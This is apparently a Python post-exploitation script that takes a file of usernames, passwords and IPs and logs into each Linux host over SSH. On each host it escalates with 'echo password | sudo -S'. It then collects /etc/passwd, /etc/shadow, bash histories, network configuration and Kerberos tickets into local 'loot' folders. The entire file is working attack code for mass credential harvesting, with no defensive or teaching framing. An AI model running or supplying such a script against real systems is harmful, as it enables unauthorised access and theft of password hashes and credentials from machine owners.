import os
import argparse
import paramiko as paramiko
from psycopg2 import Error


# Getting arguments from command line
def get_args():
    parser = argparse.ArgumentParser("This script collects juicy loot from remote linux machines")
    parser.add_argument("-f", "--file",
                        help="file with space separated credentials: <username> <password> <ip> [<port>]",
                        required=True)

    # privilege escalation
    parser.add_argument("-p", "--privesc", help="privesc method: ss - sudo su; <??> - ??", default='ss')
    return parser.parse_args()


# Parse input file content
def parse_list():
    params = open(get_args().file, 'r')
    targets = []
    for line in params:
        if line != '\n':
            targets.append(line.rstrip().split(' '))
    return targets


# Establish connection with single host
def ssh_connect(host, user, pas, port):
    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(hostname=host, username=user, password=pas, port=port)
        print(f"[*] Connection established")
        return ssh

    except:
        print(f"[!] Could not establish connection with {host}:{port}")
        return False


# Kill the connection
def ssh_disconnect(con):
    con.close()


# Execute sigle commad + escalation payload
def ssh_exec(con, privesc, command):
    payload = privesc + command

    stdin, stdout, stderr = con.exec_command(payload)
    return stdout.read().decode()


# Select priv escalation payload (for future modifications)
def privesc_methods(privesc, pas):
    if privesc == 'ss':
        # print('[*] using sudo su for escalation')
        return f' echo {pas} | sudo -S '
    else:
        print('[*] No such privesc method')
        return 1


# Write dump about single host into file
def loot_write(ip, name, data):
    os.makedirs(f"./Linux_Loot/{ip}", exist_ok=True)
    file = open(f'./Linux_Loot/{ip}/{name}', 'w')
    file.write(data)
    file.close()


# Collect loot from single host
def collect_loot(target, privesc):
    try:
        # Establish connection with server
        if len(target) == 4:
            ssh = ssh_connect(target[2], target[0], target[1], target[3])
            print(f'Collecting loot from {target[0]}:{target[1]}@{target[2]}:{target[3]}')
        else:
            ssh = ssh_connect(target[2], target[0], target[1], '22')
            print(f'Collecting loot from {target[0]}:{target[1]}@{target[2]}:22')

        # Break if connection wasn't established
        if not ssh:
            return False

        # Execute command
        pe = privesc_methods(privesc, target[1])

        loot_file_list = ['tail -n +1 /etc/passwd', 'tail -n +1 /etc/shadow', 'tail -n +1 /root/.bash_history', 'tail -n +1 /home/*/.bash_history', 'tail -n +1 /etc/hosts', 'tail -n +1 /etc/resolv.conf', 'klist']
        for command in loot_file_list:
            # Write loot to the file
            loot_write(target[2], command.split()[-1].replace("/", "_"), ssh_exec(ssh, pe, command))

        # Close connection
        ssh_disconnect(ssh)
        print("[+] Success!")

    except (Exception, Error) as error:
        print("[!] Operation failed: ", error)


# Try to collect loot from all given hosts
def loot_all_hosts(targets, privesc):
    print('+----------------------TARGETS-----------------------+')
    for target in targets:
        collect_loot(target, privesc)


if __name__ == "__main__":
    loot_all_hosts(parse_list(), get_args().privesc)
    print("+----------------------------------------------------+")
